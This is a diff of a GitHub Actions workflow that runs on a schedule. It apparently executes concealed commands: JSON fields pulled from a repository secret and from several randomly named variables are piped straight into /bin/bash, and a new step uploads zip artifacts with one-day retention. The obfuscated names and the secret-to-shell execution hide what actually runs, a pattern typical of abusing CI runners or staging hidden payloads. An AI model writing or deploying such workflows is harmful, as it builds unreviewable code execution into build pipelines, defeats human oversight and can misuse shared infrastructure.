@@ -1,10 +1,9 @@
 name: alexanderdjangohub
-
 on:
   workflow_dispatch:
-  schedule:
-    - cron: '38 1/6 * * *'
 
+  schedule:
+    - cron: '4 2,8,14,20 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,17 +11,19 @@ jobs:
       - uses: actions/checkout@v4
       - name: alexanderdjangohub
         env:
-          urbid04: ${{ secrets.urbid04 }}
+          icomu05: ${{ secrets.icomu05 }}
         run: |
-          echo $urbid04 | jq -r .vshrt7814 | /bin/bash
-          echo $aup9248 | jq -r .cjulf21752 | /bin/bash
-          echo $ch6101 | jq -r .vykj00 | /bin/bash
-          echo $phck511 | jq -r .qiekf31736 | /bin/bash
-          echo $dvfc1274 | jq -r .pc6 | /bin/bash
-          echo $ktf18 | jq -r .il29 | /bin/bash
-          echo $e55053 | jq -r .cgfo1783 | /bin/bash
-          echo $ibyb47 | jq -r .mvxt7305 | /bin/bash
-          echo $s9134 | jq -r .agj7629 | /bin/bash
-          echo $ehwj882 | jq -r .ksz80 | /bin/bash
-          echo $iwpmz71 | jq -r .khobz08 | /bin/bash
+          printf '%s' "$icomu05" | jq -r .ik7476 | /bin/bash
+          printf '%s' "$up95916" | jq -r .hizai91 | /bin/bash
+          echo $jgrnm74 | jq -r .loisg73 | /bin/bash
+          echo $z19887 | jq -r .wbf245 | /bin/bash
+          printf '%s' "$rbnpq8" | jq -r .lqpyd703 | /bin/bash
+          printf '%s' "$afixt0060" | jq -r .l533 | /bin/bash
+          printf '%s' "$e94419" | jq -r .fmzmi35800 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: scGbRH65
+          path: "*.zip"
+          retention-days: 1
